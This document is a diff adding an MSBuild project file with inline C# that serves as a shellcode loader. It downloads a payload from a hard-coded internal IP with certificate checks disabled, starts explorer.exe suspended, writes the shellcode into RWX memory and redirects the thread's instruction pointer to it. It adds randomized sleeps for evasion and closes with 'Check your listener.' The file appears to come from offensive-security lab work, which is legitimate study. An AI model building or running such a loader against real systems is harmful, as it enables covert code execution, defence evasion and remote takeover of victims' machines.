@@ -1,0 +1,336 @@
+<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe processHollow.csproj -->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+  
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+          using System;
+          using System.Net;
+          using System.Runtime.InteropServices;
+          using System.Threading;
+
+          public class ClassExample : Microsoft.Build.Utilities.Task
+          {
+              [StructLayout(LayoutKind.Sequential)]
+              public struct STARTUPINFO
+              {
+                  public uint cb;
+                  public string lpReserved;
+                  public string lpDesktop;
+                  public string lpTitle;
+                  public uint dwX;
+                  public uint dwY;
+                  public uint dwXSize;
+                  public uint dwYSize;
+                  public uint dwXCountChars;
+                  public uint dwYCountChars;
+                  public uint dwFillAttribute;
+                  public uint dwFlags;
+                  public ushort wShowWindow;
+                  public ushort cbReserved2;
+                  public IntPtr lpReserved2;
+                  public IntPtr hStdInput;
+                  public IntPtr hStdOutput;
+                  public IntPtr hStdError;
+              }
+
+              [StructLayout(LayoutKind.Sequential)]
+              public struct PROCESS_INFORMATION
+              {
+                  public IntPtr hProcess;
+                  public IntPtr hThread;
+                  public uint dwProcessId;
+                  public uint dwThreadId;
+              }
+
+              [StructLayout(LayoutKind.Sequential)]
+              public struct PROCESS_BASIC_INFORMATION
+              {
+                  public IntPtr ExitStatus;
+                  public IntPtr PebAddress;
+                  public IntPtr AffinityMask;
+                  public IntPtr BasePriority;
+                  public IntPtr UniqueProcessId;
+                  public IntPtr InheritedFromUniqueProcessId;
+              }
+
+              [StructLayout(LayoutKind.Sequential)]
+              public struct CONTEXT64
+              {
+                  public ulong P1Home;
+                  public ulong P2Home;
+                  public ulong P3Home;
+                  public ulong P4Home;
+                  public ulong P5Home;
+                  public ulong P6Home;
+                  public ulong ContextFlags;
+                  public uint MxCsr;
+                  public ushort SegCs;
+                  public ushort SegDs;
+                  public ushort SegEs;
+                  public ushort SegFs;
+                  public ushort SegGs;
+                  public ushort SegSs;
+                  public uint EFlags;
+                  public ulong Dr0;
+                  public ulong Dr1;
+                  public ulong Dr2;
+                  public ulong Dr3;
+                  public ulong Dr6;
+                  public ulong Dr7;
+                  public ulong Rax;
+                  public ulong Rcx;
+                  public ulong Rdx;
+                  public ulong Rbx;
+                  public ulong Rsp;
+                  public ulong Rbp;
+                  public ulong Rsi;
+                  public ulong Rdi;
+                  public ulong R8;
+                  public ulong R9;
+                  public ulong R10;
+                  public ulong R11;
+                  public ulong R12;
+                  public ulong R13;
+                  public ulong R14;
+                  public ulong R15;
+                  public ulong Rip;
+                  public ulong Dr0_2;
+                  public ulong Dr1_2;
+                  public ulong Dr2_2;
+                  public ulong Dr3_2;
+                  public ulong Dr6_2;
+                  public ulong Dr7_2;
+              }
+
+              [DllImport("ntdll.dll")]
+              static extern int NtWriteVirtualMemory(
+                  IntPtr hProcess,
+                  IntPtr lpBaseAddress,
+                  byte[] lpBuffer,
+                  int NumberOfBytesToWrite,
+                  out IntPtr lpNumberOfBytesWritten
+              );
+
+              [DllImport("ntdll.dll")]
+              static extern int NtReadVirtualMemory(
+                  IntPtr hProcess,
+                  IntPtr lpBaseAddress,
+                  byte[] lpBuffer,
+                  int NumberOfBytesToRead,
+                  out IntPtr lpNumberOfBytesRead
+              );
+
+              [DllImport("ntdll.dll", SetLastError = true)]
+              static extern bool NtResumeProcess(IntPtr hThread);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern bool CreateProcess(
+                  string lpApplicationName,
+                  string lpCommandLine,
+                  IntPtr lpProcessAttributes,
+                  IntPtr lpThreadAttributes,
+                  bool bInheritHandles,
+                  uint dwCreationFlags,
+                  IntPtr lpEnvironment,
+                  string lpCurrentDirectory,
+                  ref STARTUPINFO lpStartupInfo,
+                  out PROCESS_INFORMATION lpProcessInformation
+              );
+
+              [DllImport("ntdll.dll")]
+              static extern int NtQueryInformationProcess(
+                  IntPtr hProcess,
+                  int processInformationClass,
+                  ref PROCESS_BASIC_INFORMATION processInformation,
+                  uint processInformationLength,
+                  ref uint returnLength
+              );
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern bool VirtualProtectEx(
+                  IntPtr hProcess,
+                  IntPtr lpAddress,
+                  uint dwSize,
+                  uint flNewProtect,
+                  out uint lpflOldProtect
+              );
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern IntPtr VirtualAllocEx(
+                  IntPtr hProcess,
+                  IntPtr lpAddress,
+                  uint dwSize,
+                  uint flAllocationType,
+                  uint flProtect
+              );
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern bool WriteProcessMemory(
+                  IntPtr hProcess,
+                  IntPtr lpBaseAddress,
+                  byte[] lpBuffer,
+                  int nSize,
+                  out UIntPtr lpNumberOfBytesWritten
+              );
+
+              [DllImport("ntdll.dll")]
+              static extern uint NtGetContextThread(IntPtr hThread, ref CONTEXT64 lpContext);
+
+              [DllImport("ntdll.dll")]
+              static extern uint NtSetContextThread(IntPtr hThread, ref CONTEXT64 lpContext);
+
+              private static byte[] DownloadShellcode()
+              {
+                  try
+                  {
+                      ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                      ServicePointManager.ServerCertificateValidationCallback = (s, cert, chain, errors) => true;
+
+                      using (WebClient wc = new WebClient())
+                      {
+                          wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
+                          wc.Headers.Add("Accept", "application/octet-stream, */*");
+                          wc.Headers.Add("Accept-Encoding", "gzip, deflate");
+
+                          Thread.Sleep(new Random().Next(1500, 3500));
+                          return wc.DownloadData("http://192.168.45.161/sc.bin");
+                      }
+                  }
+                  catch (Exception ex)
+                  {
+                      Console.WriteLine("Download failed: " + ex.Message);
+                      return null;
+                  }
+              }
+
+              public static void Main()
+              {
+                  // Memory allocation constants
+                  const uint MEM_COMMIT = 0x1000;
+                  const uint MEM_RESERVE = 0x2000;
+                  const uint PAGE_EXECUTE_READWRITE = 0x40;
+                  const uint CREATE_SUSPENDED = 0x00000004;
+
+                  // Download shellcode
+                  Console.WriteLine("Downloading shellcode...");
+                  byte[] shellcode = DownloadShellcode();
+                  if (shellcode == null)
+                  {
+                      Console.WriteLine("Failed to download shellcode!");
+                      return;
+                  }
+                  Console.WriteLine("Downloaded {0} bytes of shellcode", shellcode.Length);
+
+                  // Create suspended explorer.exe process
+                  Console.WriteLine("Creating suspended explorer.exe process...");
+                  STARTUPINFO si = new STARTUPINFO();
+                  PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                  bool res = CreateProcess(null, "C:\\Windows\\explorer.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
+                  if (!res)
+                  {
+                      Console.WriteLine("Failed to create suspended process!");
+                      return;
+                  }
+                  Console.WriteLine("Created suspended process PID: {0}", pi.dwProcessId);
+
+                  // Add timing delay for evasion
+                  Thread.Sleep(new Random().Next(800, 2000));
+
+                  // Allocate memory in target process
+                  Console.WriteLine("Allocating memory in target process...");
+                  IntPtr allocatedMemory = VirtualAllocEx(
+                      pi.hProcess,
+                      IntPtr.Zero,
+                      (uint)shellcode.Length,
+                      MEM_COMMIT | MEM_RESERVE,
+                      PAGE_EXECUTE_READWRITE
+                  );
+
+                  if (allocatedMemory == IntPtr.Zero)
+                  {
+                      Console.WriteLine("Failed to allocate memory in target process!");
+                      return;
+                  }
+                  Console.WriteLine("Allocated memory at: 0x{0:X}", allocatedMemory.ToInt64());
+
+                  // Write shellcode to allocated memory
+                  Console.WriteLine("Writing shellcode to target process...");
+                  UIntPtr bytesWritten;
+                  bool writeSuccess = WriteProcessMemory(
+                      pi.hProcess,
+                      allocatedMemory,
+                      shellcode,
+                      shellcode.Length,
+                      out bytesWritten
+                  );
+
+                  if (!writeSuccess || (int)bytesWritten != shellcode.Length)
+                  {
+                      Console.WriteLine("Failed to write shellcode! Bytes written: {0}/{1}", bytesWritten, shellcode.Length);
+                      return;
+                  }
+                  Console.WriteLine("Successfully wrote {0} bytes to target process", bytesWritten);
+
+                  // Add another timing delay
+                  Thread.Sleep(new Random().Next(500, 1200));
+
+                  // Get current thread context
+                  Console.WriteLine("Modifying thread context...");
+                  CONTEXT64 context = new CONTEXT64();
+                  context.ContextFlags = 0x10001F; // CONTEXT_FULL
+
+                  uint contextResult = NtGetContextThread(pi.hThread, ref context);
+                  if (contextResult != 0)
+                  {
+                      Console.WriteLine("Failed to get thread context! Status: 0x{0:X}", contextResult);
+                      return;
+                  }
+
+                  // Redirect RIP to our allocated shellcode
+                  context.Rip = (ulong)allocatedMemory;
+
+                  // Set modified context
+                  uint setContextResult = NtSetContextThread(pi.hThread, ref context);
+                  if (setContextResult != 0)
+                  {
+                      Console.WriteLine("Failed to set thread context! Status: 0x{0:X}", setContextResult);
+                      return;
+                  }
+                  Console.WriteLine("Thread context modified - RIP redirected to: 0x{0:X}", context.Rip);
+
+                  // Add final timing delay
+                  Thread.Sleep(new Random().Next(300, 800));
+
+                  // Resume the process
+                  Console.WriteLine("Resuming process execution...");
+                  bool resumeStatus = NtResumeProcess(pi.hProcess);
+                  if (!resumeStatus)
+                  {
+                      Console.WriteLine("Error resuming process!");
+                      return;
+                  }
+
+                  Console.WriteLine("Process hollowing completed successfully!");
+                  Console.WriteLine("Boom! Check your listener.");
+              }
+
+              public override bool Execute()
+              {
+                  Main();
+                  return true;
+              }
+          }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
